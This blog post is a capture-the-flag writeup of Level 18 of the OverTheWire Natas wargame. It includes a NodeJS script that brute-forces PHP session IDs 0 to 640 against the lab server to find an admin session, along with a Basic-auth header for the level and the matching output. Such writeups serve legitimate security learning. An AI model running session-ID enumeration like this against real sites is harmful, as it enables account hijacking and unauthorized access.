---
layout: post
title: natas-writeup - lv18-lv??
excerpt: "Writeup for the Natas wargame on overthewire.org, from Level 18 to ??."
categories: [writeup]
tags: [itsec, wargame]
---

[overthewire / natas](http://www.overthewire.org/wargames/natas/)

## Level 18 ##

In this level we're given access to the source behind `index.php`. I originally thought there might be something in the way user inputs were compared but no luck. 2 things caught my attention - the first being a comment on the maximum number of sessions: `$maxid = 640; // 640 should be enough for everyone `, followed by the snippet below:

{% highlight javascript %}
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true; 
{% endhighlight %}

Which seems to indicate some sessions would already have the `admin` flag set - so why not iterate through all 640 of them and see if the flag is set correctly somewhere?

I fired up Burp Intruder but given I only have the community edition, which throttles requests, it turned out to be faster to write the NodeJS snippet below:


{% highlight javascript %}
const got = require('got');

const sessionIds = [...Array(641).keys()]; // there are 640
sessionIds.forEach( (sessionId) => {
  got.get('http://natas18.natas.labs.overthewire.org/index.php?debug', {                                             headers: {                                                                                                         'Authorization': 'Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==',
      'Cookie': `PHPSESSID=${sessionId}`}}).then(resp =>
      {
        if (resp.body.includes('You are an admin')) {
          console.log(`sessionId: ${sessionId} + ${resp.body}`);
        }
      });                                                                                                        });
{% endhighlight %}

And soon enough:

```
sessionId: 119 + <html>
<head>
...
<div id="content">
DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br>
...
```
